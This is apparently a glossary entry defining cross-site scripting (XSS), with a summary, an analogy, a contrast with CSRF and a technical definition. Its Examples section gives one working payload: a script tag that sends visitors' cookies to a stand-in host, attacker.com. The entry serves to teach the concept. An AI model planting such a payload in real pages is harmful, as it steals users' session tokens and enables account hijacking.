---
label: Cross-site scripting (XSS)
aliases:
  - XSS
loanwords: []
autolink:
  aliases:
    XSS: always
plain_descriptions:
  - a vulnerability where attackers inject malicious javascript into a website to hijack visitor browsers
  - sneaking rogue code into public comment sections so readers' login cookies get stolen
summary: A web application flaw permitting attackers to embed rogue executable scripts into viewed pages, running unauthorized actions inside visitor browsers.
confusable_notes:
  csrf: XSS executes malicious scripts directly inside the victim's browser session, whereas CSRF tricks the browser into sending unauthorized HTTP requests to an external trusted site.
follow_up_questions:
  - How does a Content Security Policy (CSP) header mitigate the execution of unauthorized inline scripts?
  - What distinguishes stored XSS in database fields from reflected XSS in URL query parameters?
translation: native
---

## Easy explanation
Like sticking a fake, malicious instructions sign onto a trusted public bulletin board; anyone who walks up to read the board follows the bad instructions thinking the building management posted it.

## Details
XSS occurs in stored, reflected, or DOM-based forms when web applications render unsanitized user content directly into HTML output. The injected JavaScript runs with the authority of the victim's session, allowing attackers to exfiltrate cookies, steal tokens, or deface page content.

## Technical definition
A security flaw wherein an application includes untrusted data in an HTTP response without adequate validation or escaping, leading to unauthorized script execution within the user's browser context.

## Examples
Posting `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>` in a forum comment thread so readers' session tokens are sent to an attacker.
